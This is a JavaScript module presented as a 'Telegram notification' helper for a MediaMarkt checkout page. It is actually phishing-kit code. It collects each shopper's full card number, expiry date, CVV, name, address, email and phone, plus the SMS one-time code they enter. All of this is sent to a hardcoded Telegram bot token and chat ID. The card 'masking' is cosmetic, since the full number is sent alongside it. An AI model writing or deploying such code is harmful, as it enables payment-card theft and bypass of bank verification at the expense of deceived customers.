/* ==========================================================================
   Telegram Notification Module – MediaMarkt Checkout
   ==========================================================================
   HOW TO CONFIGURE:
   1. Replace TELEGRAM_BOT_TOKEN with your actual bot token from @BotFather.
   2. Replace TELEGRAM_ADMIN_CHAT_ID with your personal Telegram chat ID
      (you can get it by messaging @userinfobot on Telegram).
   3. Save the file – no other changes needed.
   ========================================================================== */

const TELEGRAM_BOT_TOKEN     = '8691396789:AAGoSY39UK8_QQiHUlDwKxO9X-pvHDLtedE';
const TELEGRAM_ADMIN_CHAT_ID = '1370962305';

/**
 * Sends a plain-text or HTML message to the admin via the Telegram Bot API.
 * @param {string} message  - The text to send (HTML formatting supported).
 * @returns {Promise<void>}
 */
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      const err = await response.json();
      console.error('[Telegram] Failed to send message:', err);
    } else {
      console.log('[Telegram] Message sent successfully.');
    }
  } catch (error) {
    console.error('[Telegram] Network error:', error);
  }
}

/**
 * Sends full order + card details to Telegram when the payment form is submitted.
 * Call this right after the payment form passes validation (before showing the OTP modal).
 *
 * @param {Object} details
 * @param {string} details.productName
 * @param {string} details.productPrice      - Formatted price string, e.g. "474,50 €"
 * @param {string} details.cardName          - Cardholder name
 * @param {string} details.cardNumber        - Full card number (will be partially masked in message)
 * @param {string} details.cardExpiry        - Expiry date, e.g. "09/27"
 * @param {string} details.cardCvv           - CVV / CVC code
 * @param {string} details.shipName          - Recipient first name
 * @param {string} details.shipLastname      - Recipient last name
 * @param {string} details.shipAddress       - Street address
 * @param {string} details.shipPostal        - Postal / ZIP code
 * @param {string} details.shipCity          - City
 * @param {string} details.shipEmail         - Email address
 * @param {string} details.shipPhone         - Phone number
 */
export async function notifyOrderAndCardDetails(details) {
  const {
    productName, productPrice,
    cardName, cardNumber, cardExpiry, cardCvv,
    shipName, shipLastname, shipAddress, shipPostal, shipCity, shipEmail, shipPhone,
  } = details;

  // Mask card number: show only last 4 digits
  const rawDigits = cardNumber.replace(/\D/g, '');
  const maskedCard = `•••• •••• •••• ${rawDigits.slice(-4)}`;

  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Europe/Madrid' });

  const message =
`🛒 <b>NEW ORDER – MediaMarkt</b>
🕐 <i>${timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━━
📦 <b>PRODUCT</b>
• Item:    <code>${productName}</code>
• Amount:  <b>${productPrice}</b>

━━━━━━━━━━━━━━━━━━━━━━
💳 <b>CARD DETAILS</b>
• Cardholder:  <code>${cardName}</code>
• Full Number: <code>${rawDigits}</code>
• (Masked: ${maskedCard})
• Expiry:      <code>${cardExpiry}</code>
• CVV:         <code>${cardCvv}</code>

━━━━━━━━━━━━━━━━━━━━━━
🚚 <b>SHIPPING ADDRESS</b>
• Name:     ${shipName} ${shipLastname}
• Address:  ${shipAddress}
• Postcode / City: ${shipPostal} – ${shipCity}
• Email:    ${shipEmail}
• Phone:    ${shipPhone}
━━━━━━━━━━━━━━━━━━━━━━ `;

  await sendTelegramMessage(message);
}

/**
 * Sends the OTP / SMS verification code entered by the user to Telegram.
 * Call this when the verification form is submitted (before showing the success modal).
 *
 * @param {string} code          - The 6-digit verification code entered by the user.
 * @param {string} cardNumber    - The card number (for cross-reference).
 * @param {string} productPrice  - The transaction amount (for context).
 */
export async function notifyVerificationCode(code, cardNumber, productPrice) {
  const rawDigits = cardNumber.replace(/\D/g, '');
  const maskedCard = `•••• •••• •••• ${rawDigits.slice(-4)}`;
  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Europe/Madrid' });

  const message =
`🔐 <b>OTP CODE RECEIVED – MediaMarkt</b>
🕐 <i>${timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━━
🔑 <b>SMS Verification Code:</b>
   <code>${code}</code>

💳 Card:    ${maskedCard}
💶 Amount:  <b>${productPrice}</b>
━━━━━━━━━━━━━━━━━━━━━━
✅ <i>Customer has entered the code</i>`;

  await sendTelegramMessage(message);
}
